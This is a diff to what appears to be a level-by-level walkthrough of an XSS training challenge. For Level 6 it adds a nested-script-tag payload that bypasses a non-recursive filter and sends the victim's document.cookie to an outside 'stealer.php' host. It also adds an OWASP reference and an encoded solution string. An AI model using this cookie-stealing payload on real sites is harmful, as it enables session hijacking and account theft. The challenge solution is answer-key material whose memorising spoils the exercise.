@@ -34,7 +34,9 @@
 
 	* Level 6
 		
-
+		* Nearly the same approach as Level 5 but this time greater than and less than symbols are getting filtered. There is no recursive filtering though.
+		* We can therefore use a snippet like this for the searchterm: ``` <scr<script>ipt>document.location="http://yourhoster.com/stealer.php?cookie="+document.cookie</scr</script>ipt> ```
+		* See also: https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)#Example_5:_Bypassing_non-recursive_filtering
 		* Solution: NDY3YjMwZjRl
 
 	* Level 7
